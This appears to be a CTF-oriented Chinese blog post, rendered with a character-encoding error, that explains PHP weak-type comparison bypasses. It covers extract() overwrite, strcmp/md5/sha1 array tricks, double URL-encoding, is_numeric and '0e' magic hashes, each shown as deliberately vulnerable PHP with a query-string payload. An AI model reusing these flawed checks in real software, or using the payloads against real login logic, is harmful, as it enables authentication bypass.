    <url>/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šPHPå¼±ç±»å‹ç»•è¿‡æ–¹æ³•</p> <a id="more"></a><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>ä¹‹å‰åšè¿‡æ²¡æœ‰æ€»ç»“ï¼Œè¿™å‡ å¤©åšé¢˜ç»å¸¸é‡è§å¼±ç±»å‹ç»•è¿‡ï¼Œå†™ç¯‡åšå®¢æ€»ç»“ä¸€ä¸‹(æ°´ä¸€ç¯‡)ï¼Œå˜»å˜»ã€‚</p></blockquote><p>æåˆ°phpä»£ç ç»•è¿‡ï¼Œå¿…ç„¶ä¼šæèµ·<code>æ¯”è¾ƒæ“ä½œç¬¦</code>,ä¸‹é¢æ¥è°ˆä¸€è°ˆæ¯”è¾ƒæ“ä½œç¬¦<code>==</code>ä¸<code>===</code>ï¼Œè¿™ä¸¤ç§éƒ½å¯ä»¥æ¯”è¾ƒä¸¤ä¸ªæ•°å­—çš„å¤§å°ï¼Œä½†æ˜¯æœ‰å¾ˆæ˜æ˜¾çš„åŒºåˆ«ã€‚</p><table><thead><tr><th>æ“ä½œç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td>==</td><td>æŠŠä¸¤ç«¯å˜é‡ç±»å‹è½¬æ¢æˆç›¸åŒçš„ï¼Œå†è¿›è¡Œæ¯”è¾ƒ</td></tr><tr><td>===</td><td>å…ˆåˆ¤æ–­ä¸¤ç«¯å˜é‡ç±»å‹æ˜¯å¦ç›¸åŒï¼Œå†è¿›è¡Œæ¯”è¾ƒ</td></tr></tbody></table><p><strong>æ³¨æ„</strong>ï¼šåœ¨ä¸¤ä¸ªç›¸ç­‰çš„ç¬¦å·ä¸­ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²ä¸ä¸€ä¸ªæ•°å­—ç›¸æ¯”è¾ƒæ—¶ï¼Œå­—ç¬¦ä¸²ä¼šè½¬æ¢æˆæ•°å€¼ã€‚</p><h2 id="1-extractå˜é‡è¦†ç›–"><a href="#1-extractå˜é‡è¦†ç›–" class="headerlink" title="1.extractå˜é‡è¦†ç›–"></a>1.extractå˜é‡è¦†ç›–</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>;<br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>)) &#123;<br><span class="hljs-variable">$content</span>=trim(file_get_contents(<span class="hljs-variable">$flag</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>) &#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;flag&#123;xxx&#125;&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>extract()</td><td>å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨</td></tr></tbody></table><p>åœ¨ç¬¬ä¸‰è¡Œ, è¿ç”¨äº†extract()å‡½æ•°, å°†GETæ–¹å¼è·å¾—çš„å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­,ç„¶ååˆ¤æ–­$ flagå’Œ$ shiyanä¸¤ä¸ªå˜é‡çš„å†…å®¹æ˜¯å¦ç›¸ç­‰ã€‚</p><p>extract()å‡½æ•°å¯¼è‡´è¿™æ®µä»£ç å­˜åœ¨ä¸€ä¸ªå˜é‡è¦†ç›–æ¼æ´,æ„é€ Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload:?flag=&amp;shiyan=<br></code></pre></td></tr></table></figure><p> $ flagå’Œ$ shiyanè¿™ä¸¤ä¸ªå˜é‡çš„å†…å®¹éƒ½ä¼šè¢«è®¾ç½®æˆç©ºå­—ç¬¦ä¸²ã€‚è¿™æ ·,å°±æ»¡è¶³$shiyan == $contentçš„æ¡ä»¶ï¼Œè¾“å‡ºflagã€‚<br><img src="https://img-blog.csdnimg.cn/20200425110348780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#2-strcmpæ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="2.strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"></a>2.strcmpæ¯”è¾ƒå­—ç¬¦ä¸²</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;xxxxx&#125;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (strcmp(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">//å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</span><br><span class="hljs-comment">//æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>); <br>    <span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;No&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>å‡½æ•°</th><th>ç”¨æ³•</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr><td>strcmp()</td><td>strcmp(string1,string2)</td><td>è‹¥è¿”å›0,ä»£è¡¨ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ ï¼›è‹¥è¿”å›&lt;0 ,ä»£è¡¨string1 å°äº string2ï¼›è‹¥è¿”å›&gt;0ï¼Œä»£è¡¨string1 å¤§äº string2</td></tr></tbody></table><p>å¯¹äºä¼ å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œstrcmpå‡½æ•°ä¼šæŠ¥é”™ï¼Œå°†return 0 ï¼Œä½†å´åˆ¤å®šå…¶ç›¸ç­‰äº†ã€‚<br> æ‰€ä»¥ï¼Œstrcmp()åœ¨æ¯”è¾ƒå­—ç¬¦ä¸²å’Œæ•°ç»„çš„æ—¶å€™ç›´æ¥è¿”å›0ï¼Œè¿™æ ·é€šè¿‡æŠŠç›®æ ‡å˜é‡è®¾ç½®æˆæ•°ç»„å°±å¯ä»¥ç»•è¿‡è¯¥å‡½æ•°çš„é™åˆ¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload:?a[]=<span class="hljs-number">123</span> <br></code></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/20200425113316110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="3-urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#3-urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="3.urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"></a>3.urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$_GET</span>[id] = urldecode(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access granted!&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>urldecode()</td><td>è§£ç å·²ç¼–ç çš„ URL å­—ç¬¦ä¸²</td></tr></tbody></table><p>ä½¿ç”¨GETä¼ å‚æ—¶ï¼Œæµè§ˆå™¨å°±å·²ç»æŠŠhakerDJè¿›è¡Œäº†ä¸€æ¬¡è§£ç äº†ï¼Œç„¶ååˆç”¨äº†urldecodeå‡½æ•°åˆå†æ¬¡è¿›è¡Œäº†ä¸€æ¬¡è§£ç ã€‚æ‰€ä»¥æˆ‘ä»¬è¦å°†hakerDJè¿›è¡ŒäºŒæ¬¡ç¼–ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">42</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">41</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031180041123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="4-md5-å‡½æ•°"><a href="#4-md5-å‡½æ•°" class="headerlink" title="4.md5()å‡½æ•°"></a>4.md5()å‡½æ•°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) === md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>é¡¹</th><th>æè¿°</th></tr></thead><tbody><tr><td>md5()</td><td>å‡½æ•°è®¡ç®—å­—ç¬¦ä¸²çš„ MD5 æ•£åˆ—</td></tr><tr><td>==</td><td>åªéœ€è¦ç­‰å·ä¸¤è¾¹çš„å€¼æ˜¯å¦ç›¸ç­‰ã€‚æ¯”å¦‚â€˜1â€™==1å°±æˆç«‹ï¼Œè¿”å›true</td></tr><tr><td>===</td><td>éœ€è¦å…¨ç­‰å·ä¸¤è¾¹çš„å€¼å’Œç±»å‹å…¨éƒ½ç›¸ç­‰æ‰æˆç«‹</td></tr></tbody></table><p>md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULL,ä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload:?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200425115133708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="5-æ•°ç»„è¿”å›NULLç»•è¿‡"><a href="#5-æ•°ç»„è¿”å›NULLç»•è¿‡" class="headerlink" title="5.æ•°ç»„è¿”å›NULLç»•è¿‡"></a>5.æ•°ç»„è¿”å›NULLç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>ereg</td><td>å‡½æ•°æœç´¢ç”±æŒ‡å®šçš„å­—ç¬¦ä¸²ä½œä¸ºç”±æ¨¡å¼æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå‘ç°æ¨¡å¼åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›false</td></tr><tr><td>strpos</td><td>å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</td></tr></tbody></table><p>ç¬¬4è¡Œä»£ç ï¼Œeregå‡½æ•°ä¼šå¯¹ä¼ å…¥çš„passwordä»<code>a-z,A-Z,0-9</code> è¿›è¡ŒåŒ¹é…ï¼Œå°†ä½ çš„å¯†ç é™åˆ¶åœ¨è¿™ä¸‰ç§å­—ç¬¦ä¸­ã€‚</p><p><strong>æ–¹æ³•ä¸€</strong>ï¼š<br><code>strpos()</code>éœ€è¦åŒ¹é…åˆ°<code>--</code>æ‰èƒ½è¾“å‡ºflagï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡<code>strpos()</code>å‡½æ•°ã€‚<code>strpos()</code>å¦‚æœä¼ å…¥æ•°ç»„ï¼Œä¼šè¿”å›NULLã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031185451492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>æ–¹æ³•äºŒ</strong>ï¼š</p><p>æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„, æˆ‘ä»¬å¯ä»¥ç”¨%00æ¥æˆªæ–­ï¼Œåœ¨%00ä¹‹åçš„æ•°å€¼å‡½æ•°æ— æ³•è¯†åˆ«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1</span>%<span class="hljs-number">00</span>--<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031185650537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="6-å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"><a href="#6-å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="6. å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"></a>6. å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>is_numeric(<span class="hljs-variable">$temp</span>)?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no numeric&quot;</span>):<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$temp</span>&gt;<span class="hljs-number">1336</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>is_numeric()</td><td>åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</td></tr></tbody></table><p>ä¼ å…¥çš„å€¼ä¼šè¢«is_numericå‡½æ•°è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœä¸ºæ•°å­—å°±ç›´æ¥è¾“å‡ºno numericï¼Œä¼ å‚<code>password=2000a</code>æ—¢ä¸æ˜¯ä¸€ä¸ªæ•°å­—åˆå¤§äº1336,è¿”å›NULLï¼Œå¯ä»¥ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">2000</span>a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031192339220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="7-sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a href="#7-sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="7. sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a>7. sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h2><p><a href="http://123.206.87.240:9009/7.php">http://123.206.87.240:9009/7.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;  &quot;</span>;<br>var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>var_dump(sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br>var_dump(sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>; <br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>); <span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password.&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>sha1()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹ï¼Œé€šè¿‡æ„é€ æ•°ç»„ï¼Œå°†æŠ¥é”™å¹¶è¿”å›falseï¼Œä½¿æ¡ä»¶æˆç«‹ï¼Œè¿™æ ·å°±ç»•è¿‡äº†sha1()å‡½æ•°ï¼Œè·å¾—flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031215444337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="8-md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"><a href="#8-md5åŠ å¯†ç›¸ç­‰ç»•è¿‡" class="headerlink" title="8. md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"></a>8. md5åŠ å¯†ç›¸ç­‰ç»•è¿‡</h2><p><a href="http://123.206.87.240:9009/13.php">http://123.206.87.240:9009/13.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>$md51 = md5(&#x27;QNKCDZO&#x27;);<br>$a = @$_GET[<span class="hljs-string">&#x27;a&#x27;</span>];<br>$md52 = @md5($a);<br><span class="hljs-keyword">if</span>(isset($a)) &#123;<br>if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;<br>echo <span class="hljs-string">&quot;flag&#123;*&#125;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo <span class="hljs-string">&quot;false!!!&quot;</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo <span class="hljs-string">&quot;please input a&quot;</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²QNKCDZOè¢«md5åŠ å¯†åä¹‹åæ˜¯å‰ä¸¤ä½ä¸º<code>0e</code>ï¼Œç„¶åæˆ‘ä»¬æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²çš„md5ä¹‹åçš„ç»“æœä¹Ÿä¸ºe0xxxçš„å°±å¯ä»¥ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?a=s878926199a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201103191138163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" 